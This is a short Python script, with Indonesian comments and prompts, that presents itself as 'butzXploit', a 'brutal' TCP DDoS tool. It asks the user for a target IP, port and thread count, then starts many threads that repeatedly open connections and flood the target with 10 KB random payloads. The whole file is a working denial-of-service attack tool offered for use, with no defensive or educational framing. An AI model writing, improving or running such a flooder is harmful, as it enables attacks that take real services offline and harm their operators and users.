# -*- coding: utf-8 -*-
# butzXploit - Brutal TCP DDoS tanpa sound, anti-error
import socket
import threading
import os
import random
import time
import ssl
import sys
import os

# Tampilan awal
os.system('clear')
print("""
\033[1;91m╔══════════════════════════════════════════════╗
║  \033[1;97mFull Brutal DDoS Sadis Mode by \033[1;96mbutzXploit  \033[1;91m║
╚══════════════════════════════════════════════╝
""")

# Input target
ip = input("IP Target  : ")
domain = input("Domain Target  : ")
port = int(input("Port       : "))
threads = int(input("Threads    : "))

# Payload brutal
payload = random._urandom(10240)  # 10KB data

# Fungsi serangan
def ddos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(payload)
            for i in range(100):
                s.send(payload)
            print(f"\033[1;92m[✓] Sent brutal packet to {ip}:{port}\033[0m")
            s.close()
        except:
            print(f"\033[1;91m[!] Target {ip}:{port} DOWN or BLOCKED!\033[0m")
            break

# Menjalankan thread
print("\n\033[1;93m[!] Menyerang... bersiaplah!\033[0m\n")
time.sleep(1)

for i in range(threads):
    thread = threading.Thread(target=ddos)
    thread.start()
